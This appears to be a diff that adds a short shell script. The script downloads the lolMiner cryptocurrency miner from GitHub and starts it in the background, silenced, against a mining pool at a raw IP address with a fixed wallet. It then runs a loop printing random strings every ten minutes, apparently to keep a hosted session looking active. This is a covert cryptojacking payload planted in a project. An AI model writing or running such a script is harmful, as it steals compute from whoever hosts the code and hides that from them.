@@ -1,0 +1,5 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.57/lolMiner_v1.57_Lin64.tar.gz
+tar xf lolMiner_v1.57_Lin64.tar.gz
+cd 1.57
+./lolMiner --algo C29AE --pool stratum+tcp://170.187.229.90:80 --user ak_2ra4Enw7abrDKAs9NeyRRBFcaVveatfqM7xrwQ4LnWqw9nPKD7.$(echo $(shuf -i 1-20000 -n 1)-kidz) --pass 123 --dns-over-http=2 208.67.222.222 > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
